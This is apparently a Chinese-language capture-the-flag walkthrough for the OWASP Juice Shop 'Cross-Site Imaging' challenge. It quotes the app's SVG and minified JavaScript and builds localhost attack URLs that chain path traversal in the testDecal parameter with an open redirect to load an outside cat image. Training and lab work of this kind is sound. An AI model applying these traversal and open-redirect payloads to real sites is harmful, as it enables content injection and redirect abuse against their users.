---
title: Cross-Site Imaging
description: 查看前端代码定位资源加载代码，找到使用 URL 查询参数的值覆盖资源的语句，对 URL 查询参数值进行路径遍历，使用已知的开放重定向漏洞，最终跨域加载图片到目标位置
---

- 描述：把可爱跨领域的猫咪 https://cataas.com/cat 贴满我们的快递盒上。

- 对应位置 ```http://127.0.0.1:3000/#/deluxe-membership```
    快递箱上拥有 Logo，在 svg 标签内加载logo到不同位置形成最终的快递箱与logo的组合效果
    ```html
    <svg _ngcontent-ng-c2688854141="" preserveAspectRatio="xMidYMid meet" viewBox="0 0 720 720" xmlns="http://www.w3.org/2000/svg">
        <image _ngcontent-ng-c2688854141="" href="assets/public/images/deluxe/blankBoxes.png" x="0" y="0" height="720" width="720"></image>
        <image _ngcontent-ng-c2688854141="" x="260" y="130" height="50" href="assets/public/images/JuiceShop_Logo.png"></image>
        <image _ngcontent-ng-c2688854141="" x="230" y="330" height="70" href="assets/public/images/JuiceShop_Logo.png"></image>
        <image _ngcontent-ng-c2688854141="" x="70" y="355" height="40" href="assets/public/images/JuiceShop_Logo.png"></image>
        <image _ngcontent-ng-c2688854141="" x="120" y="450" height="55" href="assets/public/images/JuiceShop_Logo.png"></image>
        <image _ngcontent-ng-c2688854141="" x="500" y="410" height="45" href="assets/public/images/JuiceShop_Logo.png"></image>
    </svg>
    ```

- 查看示例解决方案

- 对应 ```main.js``` 的代码为
    ```javascript
    logoSrc = "assets/public/images/JuiceShop_Logo.png";

    const o = this.route.snapshot.queryParams.testDecal;
    if (e?.application && (e.application.name && (this.applicationName = e.application.name), e.application.logo)) {
        let a = e.application.logo;
        "http" === a.substring(0, 4) && (a = decodeURIComponent(a.substring(a.lastIndexOf("/") + 1))), this.logoSrc = `assets/public/images/${o||a}`
    }

    static \u0275cmp = t.VBU({
        type: n,
        selectors: [
            ["app-deluxe-user"]
        ],
        decls: 18,
        vars: 10,
        consts: [
            [1, "heading", "mat-elevation-z6"],
            ["appearance", "outlined", 1, "mat-elevation-z6", "deluxe-membership"],
            ["preserveAspectRatio", "xMidYMid meet", "viewBox", "0 0 720 720", "xmlns", "http://www.w3.org/2000/svg"],
            ["href", "assets/public/images/deluxe/blankBoxes.png", "x", "0", "y", "0", "height", "720", "width", "720"],
            ["x", "260", "y", "130", "height", "50"],
            ["x", "230", "y", "330", "height", "70"],
            ["x", "70", "y", "355", "height", "40"],
            ["x", "120", "y", "450", "height", "55"],
            ["x", "500", "y", "410", "height", "45"],
            [1, "card-text"],
            ["translate", "", 1, "item-name"],
            ["translate", "", 3, "translateParams"],
            [1, "feature-cards-container"],
            ["appearance", "outlined", 1, "mat-elevation-z6", "feature-card"],
            [1, "error"],
            ["aria-label", "Become deluxe member", "color", "primary", "mat-button", "", "mat-raised-button", "", 3, "click"],
            ["translate", ""],
            [3, "fontIcon"],
            [1, "item-name"]
        ],
        template: function(o, a) {
            1 & o && (t.nVh(0, Zc, 3, 1, "div", 0), t.j41(1, "mat-card", 1), i.qSk(), t.j41(2, "svg", 2), t.nrm(3, "image", 3)(4, "image", 4)(5, "image", 5)(6, "image", 6)(7, "image", 7)(8, "image", 8), t.k0s(), i.joV(), t.j41(9, "div", 9)(10, "strong", 10), t.EFF(11, "LABEL_DELUXE_MEMBERSHIP"), t.k0s(), t.j41(12, "span", 11), t.EFF(13, "DESCRIPTION_DELUXE_MEMBERSHIP"), t.k0s(), t.nVh(14, td, 5, 1), t.k0s()(), t.j41(15, "div", 12), t.Z7z(16, ed, 9, 7, "mat-card", 13, Kc), t.k0s()), 
            2 & o && (t.vxM(a.error ? 0 : -1), t.R7$(4), t.BMQ("href", a.logoSrc), t.R7$(), t.BMQ("href", a.logoSrc), t.R7$(), t.BMQ("href", a.logoSrc), t.R7$(), t.BMQ("href", a.logoSrc), t.R7$(), t.BMQ("href", a.logoSrc), t.R7$(4), t.Y8G("translateParams", t.eq3(8, qc, a.applicationName)), t.R7$(2), t.vxM(a.error ? -1 : 14), t.R7$(2), t.Dyx(a.SHOWCASES))
        }
    })
    ```

- 设置了 logoSrc 的固定路径，之后的代码检测并使用查询参数 testDecal 的值覆盖原值
    路径
    ```http://127.0.0.1:3000/#/deluxe-membership?testDecal=foooooooooooooooooooooo```
    对应请求
    ```GET /assets/public/images/foooooooooooooooooooooo HTTP/1.1```
    - 上下文为相对 URL
    - 可使用路径遍历
    ```../../../fooo```
    将请求
    ```/foo```

- 关联挑战 Allowlist Bypass 的开放重定向漏洞
    ```/redirect?to=https://cataas.com/cat?http://leanpub.com/juice-shop/```

- 最终攻击向量
    - 请求图片```cataas.com/cat?http://leanpub.com/juice-shop/```
    ```http://127.0.0.1:3000/#/deluxe-membership?testDecal=../../../redirect?to=<@urlencode>https://cataas.com/cat?http://leanpub.com/juice-shop/</@urlencode>```
    - 或编码后的```#``` hash片段符
    请求图片```cataas.com/cat```
    ```http://127.0.0.1:3000/#/deluxe-membership?testDecal=../../../redirect?to=<@urlencode>https://cataas.com/cat%23http://leanpub.com/juice-shop/</@urlencode>```
    - 此时可跨域加载图片为logo，但无法通过挑战
    查看示例解决方案的攻击向量时，使用了与描述的链接不同的网站
    ```https://placecats.com/g/400/500```
    修改为可能是旧版挑战的图片链接地址后通过挑战
    - ```http://127.0.0.1:3000/#/deluxe-membership?testDecal=<@urlencode>../../../redirect?to=https://placecats.com/g/400/500%23http://leanpub.com/juice-shop/</@urlencode>```